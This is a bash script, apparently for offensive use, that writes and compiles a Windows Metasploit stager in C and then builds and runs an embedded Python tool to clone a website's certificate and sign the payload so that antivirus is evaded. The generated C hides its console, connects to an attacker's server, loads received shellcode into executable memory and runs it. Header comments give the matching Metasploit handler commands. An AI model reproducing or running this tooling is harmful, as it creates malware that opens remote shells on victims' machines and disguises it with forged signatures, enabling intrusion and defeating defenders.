#!/bin/bash

# Custom windows/meterpreter/reverse_tcp
# msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 10.10.IP;set LPORT 9999;exploit"
# msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 10.10.IP;set LPORT 9999;exploit"

clear
echo "****************************************************************"
echo " Automatic C source code generator - FOR METASPLOIT "
echo " Based on rsmudge metasploit-loader "
echo " Based on NinjaParanoid's CarbonCopy "
echo " "
echo " For Debian based system Ubuntu/Mint "
echo " PE32+ executable (GUI) x86-64 "
echo "****************************************************************"

# Check if we are on Debian/Ubuntu
if [ $(which dpkg-query | grep -c "dpkg-query") -eq 0 ];
then echo "[-] no dpkg-query found in path, not Debian/Ubuntu based system, manually change the scipt"
echo " This script relies on dpkg-query to check for required packages, if running on other platform"
echo " Simply remove the section starting from #Debian-start and finishing at #Debian-end"
echo " Make sure you manually install the dependant packages"
echo ""
echo "- mingw-w64 "
echo "- python-openssl"
echo "- osslsigncode"
exit
fi

echo "[*] Checking if required software is installed "
dpkg --get-selections mingw-w64 python-openssl osslsigncode
if [ $(dpkg-query -W -f='${Status}' mingw-w64 2>/dev/null | grep -c "ok installed") -eq 0 ];
then echo "[-] Missing mingw-w64 run apt-get install mingw-w64"
exit
fi
if [ $(dpkg-query -W -f='${Status}' python-openssl 2>/dev/null | grep -c "ok installed") -eq 0 ];
then echo "[-] Missing python-openssl run apt-get install python-openssl"
exit
fi
if [ $(dpkg-query -W -f='${Status}' osslsigncode 2>/dev/null | grep -c "ok installed") -eq 0 ];
then echo "[-] Missing osslsigncode apt-get install osslsigncode"
exit
fi

echo -en 'Metasploit server IP : '
read ip
echo -en 'Metasploit port number : '
read port
echo -en 'Impersonate Certificate https site (www.google.com): '
read hostname
echo '#include <stdio.h>'> temp.c
echo '#include <stdlib.h>' >> temp.c
echo '#include <winsock2.h>' >> temp.c
echo '#include <windows.h>' >> temp.c
echo -n 'unsigned char lambert[]="' >> temp.c
echo -n $ip >> temp.c
echo -n '";' >> temp.c
echo '' >> temp.c
echo -n 'unsigned char omega[]="' >> temp.c
echo -n $port >> temp.c
echo -n '";' >> temp.c
echo '' >> temp.c
echo 'void winsock_init() {' >> temp.c
echo ' WSADATA wsaData;' >> temp.c
echo ' WORD wVersionRequested;' >> temp.c
echo ' wVersionRequested = MAKEWORD(2, 2);'>> temp.c
echo ' if (WSAStartup(wVersionRequested, &wsaData) < 0) {' >> temp.c
echo ' printf("bad\n"); '>> temp.c
echo ' WSACleanup(); '>> temp.c
echo ' exit(1);'>> temp.c
echo ' }' >> temp.c
echo ' }' >> temp.c
echo ' void punt(SOCKET my_socket, char * error) {' >> temp.c
echo ' printf("r %s\n", error);'>> temp.c
echo ' closesocket(my_socket);'>> temp.c
echo ' WSACleanup();'>> temp.c
echo ' exit(1);' >> temp.c
echo ' }' >> temp.c
echo ' int recv_all(SOCKET my_socket, void * buffer, int len) {' >> temp.c
echo ' int tret = 0;'>> temp.c
echo ' int nret = 0;'>>temp.c
echo ' void * startb = buffer;'>> temp.c
echo ' while (tret < len) {'>>temp.c
echo ' nret = recv(my_socket, (char *)startb, len - tret, 0);'>> temp.c
echo ' startb += nret;'>> temp.c
echo ' tret += nret;'>>temp.c
echo ' if (nret == SOCKET_ERROR)'>> temp.c
echo ' punt(my_socket, "no data");'>> temp.c
echo ' }'>>temp.c
echo ' return tret;'>> temp.c
echo '}' >> temp.c
echo 'SOCKET wsconnect(char * targetip, int port) {'>> temp.c
echo ' struct hostent * target;' >> temp.c
echo ' struct sockaddr_in sock;' >> temp.c
echo ' SOCKET my_socket;'>>temp.c
echo ' my_socket = socket(AF_INET, SOCK_STREAM, 0);'>> temp.c
echo ' if (my_socket == INVALID_SOCKET)'>> temp.c
echo ' punt(my_socket, ".");'>>temp.c
echo ' target = gethostbyname(targetip);'>>temp.c
echo ' if (target == NULL)'>>temp.c
echo ' punt(my_socket, "..");'>>temp.c
echo ' memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);'>>temp.c
echo ' sock.sin_family = AF_INET;'>> temp.c
echo ' sock.sin_port = htons(port);'>>temp.c
echo ' if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )'>>temp.c
echo ' punt(my_socket, "...");'>>temp.c
echo ' return my_socket;'>>temp.c
echo '}' >> temp.c
echo 'int main(int argc, char * argv[]) {' >> temp.c
echo ' FreeConsole();'>>temp.c
echo ' Sleep(15);'>>temp.c
echo ' ULONG32 size;'>>temp.c
echo ' char * buffer;'>>temp.c
echo ' void (*function)();'>>temp.c
echo ' winsock_init();'>> temp.c
echo ' SOCKET my_socket = wsconnect(lambert, atoi(omega));'>>temp.c
echo ' int count = recv(my_socket, (char *)&size, 4, 0);'>>temp.c
echo ' if (count != 4 || size <= 0)'>>temp.c
echo ' punt(my_socket, "error lenght\n");'>>temp.c
echo ' buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);'>>temp.c
echo ' if (buffer == NULL)'>>temp.c
echo ' punt(my_socket, "error in buf\n");'>>temp.c
echo ' buffer[0] = 0xBF;'>>temp.c
echo ' memcpy(buffer + 1, &my_socket, 4);'>>temp.c
echo ' count = recv_all(my_socket, buffer + 5, size);'>>temp.c
echo ' function = (void (*)())buffer;'>>temp.c
echo ' function();'>>temp.c
echo ' return 0;'>>temp.c
echo '}' >> temp.c
echo '(+) Compiling binary ..'
x86_64-w64-mingw32-gcc temp.c -o payload.exe -lws2_32 -mwindows
ls -la temp.c
strip payload.exe
file=`ls -la payload.exe` ; echo '(+)' $file

#Cleanup previous run
rm -f carboncopy.py
cat <<EOF >> carboncopy.py
#!/usr/bin/python3

##Author : Paranoid Ninja
##Email  : paranoidninja@protonmail.com
##Descr  : Spoofs SSL Certificates and Signs executables to evade Antivirus


from OpenSSL import crypto
from sys import argv, platform
import ssl
import os
import subprocess

def CarbonCopy(host, port, signee, signed):

    try:
        #Fetching Details
        print("[+] Loading public key of %s in Memory..." % host)
        ogcert = ssl.get_server_certificate((host, int(port)))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

        certDir = r'certs'
        if not os.path.exists(certDir):
            os.makedirs(certDir)

        #Creating Fake Certificate
        CNCRT = certDir + "/" + host + ".crt"
        CNKEY = certDir + "/" + host + ".key"
        PFXFILE = certDir + "/" + host + '.pfx'

        #Creating Keygen
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()

        #Setting Cert details from loaded from the original Certificate
        print("[+] Cloning Certificate Version")
        cert.set_version(x509.get_version())
        print("[+] Cloning Certificate Serial Number")
        cert.set_serial_number(x509.get_serial_number())
        print("[+] Cloning Certificate Subject")
        cert.set_subject(x509.get_subject())
        print("[+] Cloning Certificate Issuer")
        cert.set_issuer(x509.get_issuer())
        print("[+] Cloning Certificate Registration & Expiration Dates")
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        print("[+] Signing Keys")
        cert.sign(k, 'sha256')

        print("[+] Creating %s and %s" %(CNCRT, CNKEY))
        open(CNCRT, "wt").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode('utf-8'))
        open(CNKEY, "wt").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode('utf-8'))
        print("[+] Clone process completed. Creating PFX file for signing executable...")

        pfx = crypto.PKCS12Type()
        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()

        with open((PFXFILE), 'wb') as pfile:
            pfile.write(pfxdata)

        if (platform == "win32"):
            print("[+] Platform is Windows OS...")
            print("[+] Signing %s with signtool.exe..." %(signed))
            print(subprocess.check_output("copy " + signee + " " + signed, shell=True).decode())
            print(subprocess.check_output("signtool.exe sign /v /f " + PFXFILE + " /d \"MozDef Corp\" /tr \"http://sha256timestamp.ws.symantec.com/sha256/timestamp\" /td SHA256 /fd SHA256 " + signed, shell=True).decode())

        else:
            print("[+] Platform is Linux OS...")
            print("[+] Signing %s with %s using osslsigncode..." %(signee, PFXFILE))
            args = ("osslsigncode", "sign", "-pkcs12", PFXFILE, "-n", "Notepad Benchmark Util", "-i", "http://sha256timestamp.ws.symantec.com/sha256/timestamp", "-in", signee, "-out", signed)
            popen = subprocess.Popen(args, stdout=subprocess.PIPE)
            popen.wait()
            output = popen.stdout.read()
            print("[+] " + output.decode('utf-8'))

    except Exception as ex:
        print("[X] Something Went Wrong!\n[X] Exception: " + str(ex))

def main():
    if (len(argv) != 5):
        print(""" +-+-+-+-+-+-+-+-+-+-+-+-+
 |C|a|r|b|o|n|S|i|g|n|e|r|
 +-+-+-+-+-+-+-+-+-+-+-+-+""")
        print("\n  CarbonSigner v1.0\n  Author: Paranoid Ninja\n\n[+] Descr: Impersonates the Certificate of a website\n[!] Usage: " + argv[0] + " <hostname> <port> <build-executable> <signed-executable>\n")
    else:
        print(""" +-+-+-+-+-+-+-+-+-+-+-+-+
 |C|a|r|b|o|n|S|i|g|n|e|r|
 +-+-+-+-+-+-+-+-+-+-+-+-+""")
        print("\n  CarbonSigner v1.0\n  Author: Paranoid Ninja\n")
        CarbonCopy(argv[1], argv[2], argv[3], argv[4])

if __name__=="__main__":
    main()
EOF

python ./carboncopy.py $hostname 443 ./payload.exe ./payload-signed.exe
ls -la ./payload-signed.exe
osslsigncode verify ./payload-signed.exe